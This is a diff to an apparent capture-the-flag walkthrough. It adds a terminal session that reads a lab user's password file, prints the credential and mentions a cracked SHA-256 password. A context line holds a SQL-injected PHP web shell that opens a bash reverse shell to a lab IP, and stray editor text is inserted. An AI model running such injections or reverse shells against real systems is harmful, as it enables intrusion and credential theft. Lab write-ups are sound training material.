@@ -138,6 +138,16 @@ SELECT "<?= exec('/bin/bash -c \"bash -i 2>&1 > /dev/tcp/192.168.56.3/8080 0>&1 
 we cat the file in `/home/LOOKATME/password`
 
 we found inside the lmezard's password
+```
+cat LOOKATME
+^[[A 2>&1
+cat: LOOKATME: Is a directory
+ls LOOKATME
+password
+cat LOOKATME/password
+lmezard:G!@M6f4Eatau{sF"
+```
+> lmezard doesn't have SSH access
 
 we can log with the user and password
 
@@ -146,7 +156,7 @@ A README file tell us that we have to solve the fun challenge to get the ssh pas
 Fun is a tar archive, with a c code split in many text files
 
 after reagrrange files in order we can see that laurie password is a sha256 hash `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4` from the string `Iheartpwnage`
-
+:wq:wq
 After connect to laurie by ssh, another README tell us to solve the bomb challenge to get the Thor's password
 
 The Bomb is a program that takes lines in input. There is 6 Phases (Levels)
